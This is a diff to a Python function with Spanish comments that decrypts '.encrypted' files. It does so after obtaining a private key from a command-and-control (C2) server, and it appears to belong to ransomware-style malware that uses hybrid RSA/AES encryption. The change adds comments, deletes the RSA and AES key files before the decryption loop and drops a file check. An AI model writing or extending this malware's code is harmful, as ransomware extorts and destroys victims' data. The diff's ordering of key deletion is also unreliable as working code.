@@ -35,14 +35,18 @@ def decrypt_file(file, aes_key_decrypted):
         print(f"Error descifrando {file}: {e}")
 
 def decrypt_files():
-    agent.get_private_key()
-    files = find_files() 
-    rsa_private_key = load_private_rsa_key()
-    aes_key_encrypted = load_aes_key_encrypted()
-    aes_key = decrypt_aes_key_encrypted(rsa_private_key, aes_key_encrypted)
+    # Descifra todos los archivos cifrados encontrados
+    agent.get_private_key()  # Obtiene la clave privada del agente desde C2
+    files = find_files()  # Obtiene la lista de archivos a descifrar
+    rsa_private_key = load_private_rsa_key()  # Carga la clave privada RSA
+    aes_key_encrypted = load_aes_key_encrypted()  # Carga la clave AES cifrada
+    # Descifra la clave AES con la privada RSA
+    aes_key = decrypt_aes_key_encrypted(rsa_private_key, aes_key_encrypted)  
+    os.remove("aes_key_encrypted.bin")  # Elimina la clave AES cifrada después de su uso
+    os.remove("rsa_private.pem") # Elimina la clave privada RSA
     for file in files:
-        if file.endswith(".encrypted") and os.path.isfile(file):  # Verifica extensión y que es un archivo válido
-            decrypt_file(file, aes_key)
-    os.remove("aes_key_encrypted.bin") # Eliminar la clave AES cifrada después del proceso
-    print("Archivos descifrados correctamente.")
+        # Verifica que el archivo tenga la extensión '.encrypted' 
+        if file.endswith(".encrypted"):  
+            decrypt_file(file, aes_key)  # Llama a la función para descifrar el archivo
+    print("Archivos descifrados correctamente.")  
 
